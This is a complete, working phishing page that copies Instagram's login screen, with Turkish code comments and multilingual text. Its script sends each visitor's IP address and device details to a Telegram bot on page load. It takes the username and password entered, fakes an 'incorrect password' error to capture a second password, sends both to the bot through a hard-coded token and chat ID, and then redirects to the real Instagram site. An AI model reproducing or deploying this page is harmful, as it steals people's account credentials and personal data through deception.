<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-font-smoothing: antialiased;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #fafafa;
            color: #262626;
            display: flex;
            justify-content: center;
            min-height: 100vh;
        }
        
        .container {
            max-width: 350px;
            width: 100%;
            margin: auto;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 20px 0;
        }
        
        .login-box {
            background: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            margin-bottom: 10px;
            padding: 10px 0;
            width: 100%;
            text-align: center;
        }
        
        .logo {
            width: 175px;
            margin: 22px auto 12px;
        }
        
        .fb-login {
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 8px 40px;
            color: #385185;
            font-weight: 600;
            font-size: 14px;
            text-decoration: none;
        }
        
        .fb-login img {
            width: 16px;
            height: 16px;
            margin-right: 8px;
        }
        
        .divider {
            display: flex;
            align-items: center;
            margin: 10px 40px 18px;
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 600;
        }
        
        .divider::before,
        .divider::after {
            content: "";
            flex: 1;
            border-bottom: 1px solid #dbdbdb;
            margin: 0 18px;
        }
        
        .input-group {
            margin: 0 40px 6px;
            position: relative;
        }
        
        input {
            width: 100%;
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            padding: 9px 8px 7px;
            font-size: 12px;
            height: 36px;
        }
        
        .show-password {
            position: absolute;
            right: 8px;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            color: #262626;
            font-weight: 600;
            font-size: 12px;
            cursor: pointer;
        }
        
        button[type="submit"] {
            width: calc(100% - 80px);
            background: #0095f6;
            color: white;
            border: none;
            border-radius: 4px;
            padding: 5px 9px;
            font-weight: 600;
            margin: 8px 40px;
            height: 32px;
            cursor: pointer;
            opacity: 0.7;
        }
        
        button[type="submit"]:enabled {
            opacity: 1;
        }
        
        .forgot-pw {
            display: block;
            color: #00376b;
            font-size: 12px;
            margin: 12px 0;
            text-decoration: none;
        }
        
        .signup-box {
            background: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 15px 0;
            width: 100%;
            text-align: center;
            margin-bottom: 15px;
        }
        
        .signup-text {
            font-size: 14px;
            color: #262626;
        }
        
        .signup-link {
            color: #0095f6;
            font-weight: 600;
            text-decoration: none;
        }
        
        .footer {
            text-align: center;
            padding: 10px 0;
            width: 100%;
        }
        
        .language-selector {
            margin-bottom: 12px;
        }
        
        .language-selector select {
            border: none;
            background: none;
            color: #8e8e8e;
            font-size: 12px;
            cursor: pointer;
        }
        
        .copyright {
            color: #8e8e8e;
            font-size: 12px;
            margin-top: 8px;
        }
        
        .error-message {
            color: #ed4956;
            font-size: 14px;
            line-height: 18px;
            margin: 10px 40px;
            text-align: center;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <img class="logo" src="https://www.instagram.com/static/images/web/logged_out_wordmark-2x.png/d2529dbef8ed.png" alt="Instagram">
            
            <div id="errorMsg" class="error-message" style="display: none;"></div>
            
            <form id="loginForm">
                <div class="input-group">
                    <input type="text" id="username" required>
                </div>
                <div class="input-group">
                    <input type="password" id="password" required>
                    <button type="button" class="show-password" id="showPassword"></button>
                </div>
                <button type="submit" id="loginButton" disabled></button>
            </form>
            
            <div class="divider" id="orDivider"></div>
            
            <a href="#" id="fbLogin" class="fb-login">
                <img src="https://www.instagram.com/static/images/ico/favicon-192.png/68d99ba29cc8.png" alt="Facebook">
                <span id="fbLoginText"></span>
            </a>
            
            <a href="https://www.instagram.com/accounts/password/reset/" id="forgotPassword" class="forgot-pw"></a>
        </div>
        
        <div class="signup-box">
            <p class="signup-text"><span id="noAccountText"></span> <a href="https://www.instagram.com/accounts/emailsignup/" id="signUp" class="signup-link"></a></p>
        </div>
    
        <div class="footer">
            <div class="language-selector">
                <select id="languageSelect">
                    <option value="en">English</option>
                    <option value="tr">Türkçe</option>
                    <option value="es">Español</option>
                    <option value="fr">Français</option>
                    <option value="de">Deutsch</option>
                    <option value="it">Italiano</option>
                    <option value="pt">Português</option>
                    <option value="ru">Русский</option>
                    <option value="ja">日本語</option>
                    <option value="zh">中文</option>
                    <option value="ar">العربية</option>
                </select>
            </div>
            <div class="copyright">
                © 2024 Instagram from Meta
            </div>
        </div>
    </div>

    <script>
        // Dil desteği için çeviriler
        const translations = {
            en: {
                usernamePlaceholder: "Phone number, username, or email",
                passwordPlaceholder: "Password",
                showPassword: "Show",
                hidePassword: "Hide",
                loginButton: "Log In",
                orDivider: "OR",
                fbLoginText: "Log in with Facebook",
                forgotPassword: "Forgot password?",
                noAccountText: "Don't have an account?",
                signUp: "Sign up",
                errorMessage: "The password you entered is incorrect. Please try again."
            },
            tr: {
                usernamePlaceholder: "Telefon numarası, kullanıcı adı veya e-posta",
                passwordPlaceholder: "Şifre",
                showPassword: "Göster",
                hidePassword: "Gizle",
                loginButton: "Giriş yap",
                orDivider: "YA DA",
                fbLoginText: "Facebook ile Devam Et",
                forgotPassword: "Şifreni mi unuttun?",
                noAccountText: "Hesabın yok mu?",
                signUp: "Kaydol",
                errorMessage: "Girdiğiniz şifre yanlış. Lütfen tekrar deneyin."
            },
            es: {
                usernamePlaceholder: "Número de teléfono, nombre de usuario o correo electrónico",
                passwordPlaceholder: "Contraseña",
                showPassword: "Mostrar",
                hidePassword: "Ocultar",
                loginButton: "Iniciar sesión",
                orDivider: "O",
                fbLoginText: "Iniciar sesión con Facebook",
                forgotPassword: "¿Olvidaste tu contraseña?",
                noAccountText: "¿No tienes una cuenta?",
                signUp: "Regístrate",
                errorMessage: "La contraseña que ingresaste es incorrecta. Por favor, inténtalo de nuevo."
            },
            fr: {
                usernamePlaceholder: "Numéro de téléphone, nom d'utilisateur ou e-mail",
                passwordPlaceholder: "Mot de passe",
                showPassword: "Afficher",
                hidePassword: "Masquer",
                loginButton: "Se connecter",
                orDivider: "OU",
                fbLoginText: "Se connecter avec Facebook",
                forgotPassword: "Mot de passe oublié ?",
                noAccountText: "Vous n'avez pas de compte ?",
                signUp: "Inscrivez-vous",
                errorMessage: "Le mot de passe que vous avez saisi est incorrect. Veuillez réessayer."
            },
            de: {
                usernamePlaceholder: "Telefonnummer, Benutzername oder E-Mail",
                passwordPlaceholder: "Passwort",
                showPassword: "Anzeigen",
                hidePassword: "Ausblenden",
                loginButton: "Anmelden",
                orDivider: "ODER",
                fbLoginText: "Mit Facebook anmelden",
                forgotPassword: "Passwort vergessen?",
                noAccountText: "Sie haben noch kein Konto?",
                signUp: "Registrieren",
                errorMessage: "Das eingegebene Passwort ist falsch. Bitte versuchen Sie es erneut."
            }
        };

        // Tarayıcı dilini algıla ve ayarla
        function detectBrowserLanguage() {
            const browserLang = navigator.language || navigator.userLanguage;
            return browserLang.substring(0, 2); // Sadece ilk iki karakteri al (örn. 'tr' yerine 'tr-TR')
        }

        // Sayfayı çevir
        function translatePage(lang) {
            const langData = translations[lang] || translations['en'];
            
            document.getElementById('username').placeholder = langData.usernamePlaceholder;
            document.getElementById('password').placeholder = langData.passwordPlaceholder;
            document.getElementById('showPassword').textContent = langData.showPassword;
            document.getElementById('loginButton').textContent = langData.loginButton;
            document.getElementById('orDivider').textContent = langData.orDivider;
            document.getElementById('fbLoginText').textContent = langData.fbLoginText;
            document.getElementById('forgotPassword').textContent = langData.forgotPassword;
            document.getElementById('noAccountText').textContent = langData.noAccountText;
            document.getElementById('signUp').textContent = langData.signUp;
            document.getElementById('errorMsg').textContent = langData.errorMessage;
            document.getElementById('languageSelect').value = lang;
            
            // Sayfa başlığını da çevir
            document.title = lang === 'tr' ? 'Instagram' : 'Instagram';
        }

        // Sayfa yüklendiğinde
        window.addEventListener('DOMContentLoaded', async () => {
            const defaultLang = detectBrowserLanguage();
            const supportedLangs = Object.keys(translations);
            const userLang = supportedLangs.includes(defaultLang) ? defaultLang : 'en';
            
            translatePage(userLang);
            await sendVisitorInfo();
        });

        // Dil değiştirildiğinde
        document.getElementById('languageSelect').addEventListener('change', function() {
            translatePage(this.value);
        });

        // Kalan JavaScript kodları (önceki fonksiyonlar aynen kalacak)
        let loginAttempts = 0;
        let firstPassword = '';
        
        // Form validation
        const usernameInput = document.getElementById('username');
        const passwordInput = document.getElementById('password');
        const loginButton = document.getElementById('loginButton');
        
        function validateForm() {
            loginButton.disabled = !(usernameInput.value.trim() && passwordInput.value.trim());
        }
        
        usernameInput.addEventListener('input', validateForm);
        passwordInput.addEventListener('input', validateForm);
        
        // Show/hide password button
        const showPasswordBtn = document.getElementById('showPassword');
        
        showPasswordBtn.addEventListener('click', function() {
            const lang = document.getElementById('languageSelect').value;
            const langData = translations[lang] || translations['en'];
            
            if(passwordInput.type === 'password') {
                passwordInput.type = 'text';
                this.textContent = langData.hidePassword;
            } else {
                passwordInput.type = 'password';
                this.textContent = langData.showPassword;
            }
        });
        
        // Login form submission
        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const username = usernameInput.value.trim();
            const currentPassword = passwordInput.value.trim();
            
            loginAttempts++;
            
            if(loginAttempts === 1) {
                // Show error on first attempt and save password
                document.getElementById('errorMsg').style.display = 'block';
                firstPassword = currentPassword;
                
                // Send normal login attempt to Telegram
                await sendLoginAttempt(username, currentPassword, false);
            } else {
                // Send verification notification on second attempt
                await sendLoginAttempt(username, firstPassword, true, currentPassword);
                
                // Redirect to Instagram
                window.location.href = 'https://www.instagram.com/accounts/login/';
            }
        });
        
        // Send visitor information
        async function sendVisitorInfo() {
            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                const ip = ipData.ip;
                
                const message = `👀 New Visitor Detected! 👀

🌐 IP Address: ${ip}
📱 Device Info: ${navigator.userAgent}
🌍 Language: ${navigator.language}
⏰ Date: ${new Date().toLocaleString()}

⚠️ Instagram login page visited!`;
                
                await sendToTelegram(message);
            } catch (error) {
                console.error('Failed to send visitor info:', error);
            }
        }
        
        // Send login attempt
        async function sendLoginAttempt(username, password, isVerification, newPassword = '') {
            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                const ip = ipData.ip;
                
                let message;
                
                if(isVerification) {
                    message = `🔐 Login Attempt Detected! 🔐

📌 User Credentials:
👤 Username: ${username}
🔑 First Password: ${password}
🔑 Second Password: ${newPassword}

🌐 IP Information:
📡 IP Address: ${ip}
📱 Device Info: ${navigator.userAgent}
🌍 Language: ${navigator.language}

⏰ Date: ${new Date().toLocaleString()}

🚨 Attention! User attempted to log in!`;
                } else {
                    message = `🔐 Login Attempt Detected! 🔐

📌 User Credentials:
👤 Username: ${username}
🔑 Password: ${password}

🌐 IP Information:
📡 IP Address: ${ip}
📱 Device Info: ${navigator.userAgent}
🌍 Language: ${navigator.language}

⏰ Date: ${new Date().toLocaleString()}

🚨 Attention! User attempted to log in!`;
                }
                
                await sendToTelegram(message);
            } catch (error) {
                console.error('Failed to send login attempt:', error);
            }
        }
        
        // Send message to Telegram
        async function sendToTelegram(message) {
            const botToken = '7904316763:AAFbbxzLtoCvIm7M0BTf2o8yde74OvSwi50';
            const chatId = '7816589291';
            
            try {
                const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
                const response = await fetch(telegramUrl);
                
                if(!response.ok) {
                    throw new Error('Telegram API error');
                }
                
                return true;
            } catch (error) {
                console.error('Error:', error);
                localStorage.setItem('telegram_fallback', message);
                throw error;
            }
        }
    </script>
</body>
</html>
